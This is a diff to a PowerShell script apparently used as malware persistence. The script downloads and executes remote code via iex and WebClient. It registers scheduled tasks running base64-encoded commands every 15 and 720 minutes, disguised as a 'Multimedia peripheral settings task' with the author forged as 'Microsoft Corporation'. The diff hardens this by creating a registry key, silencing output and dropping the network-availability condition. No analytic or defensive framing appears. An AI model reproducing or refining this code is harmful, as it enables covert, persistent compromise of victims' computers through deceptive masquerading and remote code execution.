@@ -57,6 +57,10 @@ if($Script:UseObfuscation -eq $True){
     iex (New-Object System.Net.WebClient).DownloadString($TaskFile)
 }
 
+if(-not(Test-Path -Path $Script:REGISTRY_INCL)){
+  $null=New-Item -Path $Script:REGISTRY_INCL -Force -ErrorAction Ignore  
+}
+
 
 iex (Get-UpdateRegistryScript)
 
@@ -77,8 +81,8 @@ try{
     Log-String "Install-EncodedScriptTask -TaskName $FullTaskName -Interval 15 -EncodedTask Base64Command($Base64CommandLen)"
     $TaskVal=Get-ScheduledTask -TaskName $script:TASKNAME_ONE -erroraction ignore
     if($TaskVal -eq $null){
-         Get-ScheduledTask -TaskName $script:TASKNAME_ONE -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
-         Install-EncodedScriptTask -ShortTaskName "$script:TASKNAME_ONE" -TaskName $FullTaskName -Interval 15 -EncodedTask $Base64Command
+         $null=Get-ScheduledTask -TaskName $script:TASKNAME_ONE -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
+         $null=Install-EncodedScriptTask -ShortTaskName "$script:TASKNAME_ONE" -TaskName $FullTaskName -Interval 15 -EncodedTask $Base64Command
 
          $Desc = 'Multimedia peripheral settings task (0xAE01F1)'
 
@@ -90,7 +94,6 @@ try{
         if($taskObject -ne $null){
             $taskObject.Author = "Microsoft Corporation"
             $taskObject.Description = $Desc
-            $taskObject.settings.RunOnlyIfNetworkAvailable=$True
             $taskObject.version=$script:NEWTASK_VERS
             $taskObject | Set-ScheduledTask          
         }
@@ -117,8 +120,8 @@ try{
     Log-String "Install-EncodedScriptTask -TaskName $FullTaskName -Interval 720 -EncodedTask Base64Command($Base64CommandLen)"
     $TaskVal=Get-ScheduledTask -TaskName $script:TASKNAME_TWO -erroraction ignore
     if($TaskVal -eq $null){
-         Get-ScheduledTask -TaskName $script:TASKNAME_TWO -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
-         Install-EncodedScriptTask -ShortTaskName "$script:TASKNAME_TWO" -TaskName $FullTaskName -Interval 720 -EncodedTask $Base64Command
+         $null=Get-ScheduledTask -TaskName $script:TASKNAME_TWO -erroraction ignore | Unregister-ScheduledTask -Confirm:$false -erroraction ignore
+         $null=Install-EncodedScriptTask -ShortTaskName "$script:TASKNAME_TWO" -TaskName $FullTaskName -Interval 720 -EncodedTask $Base64Command
 
          $Desc = 'Multimedia peripheral settings task (0xAE01F1)'
 
@@ -130,7 +133,6 @@ try{
         if($taskObject -ne $null){
             $taskObject.Author = "Microsoft Corporation"
             $taskObject.Description = $Desc
-            $taskObject.settings.RunOnlyIfNetworkAvailable=$True
             $taskObject.version=$script:NEWTASK_VERS
             $taskObject | Set-ScheduledTask          
         }
